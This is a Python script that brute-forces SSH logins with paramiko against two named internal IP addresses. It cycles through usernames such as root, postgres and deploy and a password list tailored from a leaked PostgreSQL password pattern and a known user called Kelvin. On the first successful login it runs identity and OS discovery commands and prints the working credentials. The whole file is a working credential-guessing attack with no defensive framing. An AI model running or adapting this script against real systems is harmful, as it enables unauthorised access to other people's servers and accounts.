import sys
try:
    import paramiko
except:
    print("NO_PARAMIKO")
    sys.exit(1)

TARGETS = [
    ("10.11.116.13", 22),
    ("172.18.0.1", 22),
]

users = ['root', 'admin', 'ubuntu', 'postgres', 'docker', 'quant', 'deploy', 'grafana']

# More targeted based on what we know
passwords = [
    'Passwd2024!', 'admin123', 'Quant2024!', 'quantatrium',
    'P@ssw0rd', 'password', 'root', 'toor', '123456',
    'Qwer1234!', 'Aa123456!', '!QAZ2wsx', '1qaz@WSX',
    'Abc123456', 'Test123!', 'Docker2024!', 'grafana',
    'Redis2024!', 'UCloud2024!', 'Server2024!',
    # Based on PG password pattern: Passwd + year + special
    'Passwd2023!', 'Passwd2025!', 'Passwd123!', 'Passwd!@#',
    # Kelvin (known user)  
    'kelvin', 'kelvin123', 'Kelvin2024!', 'kelvin@kelvin',
]

for host, port in TARGETS:
    print(f"TRYING:{host}:{port}")
    for user in users:
        for pwd in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port, username=user, password=pwd, timeout=3,
                           allow_agent=False, look_for_keys=False, banner_timeout=5)
                stdin, stdout, stderr = ssh.exec_command("id;hostname;cat /etc/os-release|head -2")
                out = stdout.read().decode().strip()
                print(f"SUCCESS:{host}:{user}:{pwd}")
                print(out)
                ssh.close()
                sys.exit(0)
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                if "banner" in str(e).lower() or "refused" in str(e).lower():
                    continue
    print(f"FAILED:{host}")

print("ALL_FAILED")
